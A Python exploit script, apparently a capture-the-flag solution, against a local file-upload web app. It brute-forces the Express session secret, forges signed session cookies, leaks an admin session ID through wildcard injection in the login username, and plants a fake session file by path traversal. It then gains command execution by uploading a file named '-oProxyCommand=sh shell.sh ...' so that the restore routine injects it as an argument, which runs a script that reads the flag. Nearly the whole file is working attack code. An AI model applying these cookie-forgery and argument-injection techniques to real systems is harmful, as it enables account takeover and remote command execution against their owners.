#!/usr/bin/env python3
from base64 import b64decode, b64encode
import itertools
import json
import random
import time
from urllib.parse import unquote
from tqdm import tqdm
import requests
import string
import hmac

HOST = "http://127.0.0.1"

s = requests.Session()


def random_string(length=5):
    return "".join(random.choice(string.ascii_lowercase) for _ in range(length))


def login(username, password=""):
    r = s.post(HOST + "/login",
               data={"username": username, "password": password},
               allow_redirects=False)
    return r.status_code == 302


def get_files():
    r = s.get(HOST + "/files")
    return r.text


def get_file(filename):
    r = s.get(HOST + "/file/" + filename)
    r.raise_for_status()
    return r.text


def upload_file(filename, data=b""):
    files = {"file": (filename, data)}
    r = s.post(HOST + "/upload", files=files)
    assert "File uploaded!" in r.text, r.text
    return r


def delete_file(filename):
    r = s.post(HOST + f"/delete/{filename}")
    assert "File deleted!" in r.text, r.text
    return r


def backup():
    r = s.post(HOST + "/backup")
    return r.text


def restore():
    r = s.post(HOST + "/restore")
    return r.text


def sign_session(session, secret):
    return hmac.new(secret, session.encode(), "sha256").digest()


def create_cookie(session, secret):
    signature = sign_session(session, secret)
    signature = b64encode(signature).decode().rstrip("=")
    return f"s:{session}.{signature}"


def create_session(username):
    return {
        "cookie": {
            "originalMaxAge": 9999999999995,
            "expires": "2341-09-23T14:43:19.154Z",
            "httpOnly": True,
            "path": "/"
        },
        "username": username,
        "flash": [],
        "__lastAccess": int(time.time() * 1000)
    }


def is_admin(secret, session):
    """Forge a cookie and attempt to access the admin page"""
    admin_cookie = create_cookie(session, secret)
    r = requests.get(HOST + "/", cookies={"connect.sid": admin_cookie})
    return "admin" in r.text


def leak_admin_session(secret, prefix=""):
    """Recursive algorithm using depth-first search to find a session cookie that is admin"""

    # End condition
    if len(prefix) == 32:
        print(f"Found session: {prefix}")
        if is_admin(secret, prefix):
            print("-> Admin session found!")
            return prefix
        else:
            print("-> Not admin, backtracking...")
            return

    # Depth-first search
    for c in string.ascii_letters + string.digits + "_-":
        session = prefix + c
        if login(f"/tmp/sessions/{session}*.json"):
            print(session)
            # Recurse
            session = leak_admin_session(secret, session)
            if session:
                return session
    else:
        # This prints while backtracking
        print(prefix)


if __name__ == "__main__":
    s.get(HOST + "/404")
    own_cookie = s.cookies.get("connect.sid")
    print(f"{own_cookie=}")

    # Crack session secret
    cookie = unquote(own_cookie).lstrip("s:")
    session, signature = cookie.split(".", 1)
    signature = b64decode(signature + '===')
    for i in tqdm(range(32767)):
        secret = str(i).encode()
        possible_signature = sign_session(session, secret)
        if possible_signature == signature:
            break

    print(f"{secret=}")

    # Leak admin session cookie using wildcard boolean search
    session = leak_admin_session(secret)

    print(f"{session=}")
    admin_cookie = create_cookie(session, secret)
    print(f"{admin_cookie=}")

    s.cookies.set("connect.sid", admin_cookie)
    get_files()

    # Random suffix to not conflict with other players
    suffix = random_string()
    print(f"{suffix=}")

    # Write fake session file to uploads, then load it to have any username
    fake_session = create_session(f"*{suffix}")
    upload_file(f"fake_session{suffix}.json",
                json.dumps(fake_session).encode())

    cookie = create_cookie(f"../files/admin/fake_session{suffix}", secret)
    s.cookies.set("connect.sid", cookie)

    get_files()

    upload_file("shell.sh",
                f"/readflag > '/tmp/files/*{suffix}/flag'".encode())
    # Create argument injection wildcard matches
    upload_file(
        f"-oProxyCommand=sh shell.sh {suffix}@backup:backup.tar.gz")

    # Read flag until order of files is randomly correct (50/50)
    for i in itertools.count():
        filename = f"user{i}{suffix}@backup:backup.tar.gz"
        upload_file(filename)
        print(restore())
        try:
            print(get_file("flag"))
            break
        except requests.exceptions.HTTPError as e:
            delete_file(filename)

    delete_file("flag")
